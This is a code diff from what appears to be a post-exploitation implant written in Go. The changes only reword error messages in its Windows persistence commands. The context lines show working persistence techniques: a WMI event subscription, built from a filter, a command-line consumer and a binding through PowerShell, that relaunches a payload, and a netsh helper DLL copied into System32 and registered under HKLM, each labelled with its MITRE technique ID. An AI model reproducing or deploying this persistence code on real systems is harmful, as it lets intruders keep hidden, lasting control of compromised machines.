@@ -32,7 +32,7 @@ func persistWMIEvent(args persistArgs) structs.CommandResult {
 	case "check", "list":
 		return wmiEventCheck(args)
 	default:
-		return errorf("Error: unknown action '%s'. Use: install, remove, or check", args.Action)
+		return errorf("unknown action '%s'. Use: install, remove, or check", args.Action)
 	}
 }
 
@@ -40,13 +40,13 @@ func wmiEventInstall(args persistArgs) structs.CommandResult {
 	if args.Path == "" {
 		exe, err := os.Executable()
 		if err != nil {
-			return errorf("Error getting executable path: %v", err)
+			return errorf("getting executable path: %v", err)
 		}
 		args.Path = exe
 	}
 
 	if _, err := os.Stat(args.Path); err != nil {
-		return errorf("Error: payload not found: %v", err)
+		return errorf("payload not found: %v", err)
 	}
 
 	filterName := args.Name + "_Filter"
@@ -69,7 +69,7 @@ func wmiEventInstall(args persistArgs) structs.CommandResult {
 
 	out, err := runPowerShell(filterPS)
 	if err != nil || !strings.Contains(out, "FILTER_OK") {
-		return errorf("Error creating WMI EventFilter: %v\nOutput: %s", err, out)
+		return errorf("creating WMI EventFilter: %v\nOutput: %s", err, out)
 	}
 
 	// Step 2: Create CommandLineEventConsumer
@@ -83,7 +83,7 @@ func wmiEventInstall(args persistArgs) structs.CommandResult {
 	out, err = runPowerShell(consumerPS)
 	if err != nil || !strings.Contains(out, "CONSUMER_OK") {
 		wmiEventRemoveByName(filterName, consumerName)
-		return errorf("Error creating WMI EventConsumer: %v\nOutput: %s", err, out)
+		return errorf("creating WMI EventConsumer: %v\nOutput: %s", err, out)
 	}
 
 	// Step 3: Create FilterToConsumerBinding
@@ -98,7 +98,7 @@ func wmiEventInstall(args persistArgs) structs.CommandResult {
 	out, err = runPowerShell(bindingPS)
 	if err != nil || !strings.Contains(out, "BINDING_OK") {
 		wmiEventRemoveByName(filterName, consumerName)
-		return errorf("Error creating WMI binding: %v\nOutput: %s", err, out)
+		return errorf("creating WMI binding: %v\nOutput: %s", err, out)
 	}
 
 	return successf("WMI event subscription persistence installed (T1546.003):\n"+
@@ -174,7 +174,7 @@ func wmiEventCheck(args persistArgs) structs.CommandResult {
 
 	out, err := runPowerShell(checkPS)
 	if err != nil {
-		return errorf("Error querying WMI subscriptions: %v", err)
+		return errorf("querying WMI subscriptions: %v", err)
 	}
 
 	return successf("=== WMI Event Subscriptions (root\\subscription) ===\n\n%s", out)
@@ -209,16 +209,16 @@ func persistNetshHelper(args persistArgs) structs.CommandResult {
 	switch strings.ToLower(args.Action) {
 	case "install":
 		if args.Path == "" {
-			return errorResult("Error: path is required (DLL to register as netsh helper)")
+			return errorResult("path is required (DLL to register as netsh helper)")
 		}
 
 		if _, err := os.Stat(args.Path); err != nil {
-			return errorf("Error: DLL not found: %v", err)
+			return errorf("DLL not found: %v", err)
 		}
 
 		key, err := registry.OpenKey(registry.LOCAL_MACHINE, netshRegPath, registry.SET_VALUE|registry.QUERY_VALUE)
 		if err != nil {
-			return errorf("Error opening HKLM\\%s: %v (admin required)", netshRegPath, err)
+			return errorf("opening HKLM\\%s: %v (admin required)", netshRegPath, err)
 		}
 		defer key.Close()
 
@@ -229,24 +229,24 @@ func persistNetshHelper(args persistArgs) structs.CommandResult {
 		if args.Path != destPath {
 			src, err := os.Open(args.Path)
 			if err != nil {
-				return errorf("Error opening source DLL: %v", err)
+				return errorf("opening source DLL: %v", err)
 			}
 			defer src.Close()
 
 			dst, err := os.Create(destPath)
 			if err != nil {
-				return errorf("Error creating %s: %v (admin required)", destPath, err)
+				return errorf("creating %s: %v (admin required)", destPath, err)
 			}
 			defer dst.Close()
 
 			if _, err := io.Copy(dst, src); err != nil {
-				return errorf("Error copying DLL to System32: %v", err)
+				return errorf("copying DLL to System32: %v", err)
 			}
 		}
 
 		// Register: value name = helper name, value = DLL filename (no path — loaded from System32)
 		if err := key.SetStringValue(args.Name, dllName); err != nil {
-			return errorf("Error writing registry value: %v", err)
+			return errorf("writing registry value: %v", err)
 		}
 
 		return successf("Netsh helper DLL persistence installed (T1546.007):\n"+
@@ -259,13 +259,13 @@ func persistNetshHelper(args persistArgs) structs.CommandResult {
 	case "remove":
 		key, err := registry.OpenKey(registry.LOCAL_MACHINE, netshRegPath, registry.SET_VALUE|registry.QUERY_VALUE)
 		if err != nil {
-			return errorf("Error opening HKLM\\%s: %v", netshRegPath, err)
+			return errorf("opening HKLM\\%s: %v", netshRegPath, err)
 		}
 		defer key.Close()
 
 		dllName, _, err := key.GetStringValue(args.Name)
 		if err != nil {
-			return errorf("Error: netsh helper '%s' not found in registry: %v", args.Name, err)
+			return errorf("netsh helper '%s' not found in registry: %v", args.Name, err)
 		}
 
 		// Shred registry value
@@ -289,13 +289,13 @@ func persistNetshHelper(args persistArgs) structs.CommandResult {
 	case "check", "list":
 		key, err := registry.OpenKey(registry.LOCAL_MACHINE, netshRegPath, registry.QUERY_VALUE)
 		if err != nil {
-			return errorf("Error opening HKLM\\%s: %v", netshRegPath, err)
+			return errorf("opening HKLM\\%s: %v", netshRegPath, err)
 		}
 		defer key.Close()
 
 		names, err := key.ReadValueNames(-1)
 		if err != nil {
-			return errorf("Error reading netsh helpers: %v", err)
+			return errorf("reading netsh helpers: %v", err)
 		}
 
 		var sb strings.Builder
@@ -317,6 +317,6 @@ func persistNetshHelper(args persistArgs) structs.CommandResult {
 		return successResult(sb.String())
 
 	default:
-		return errorf("Error: unknown action '%s'. Use: install, remove, or check", args.Action)
+		return errorf("unknown action '%s'. Use: install, remove, or check", args.Action)
 	}
 }
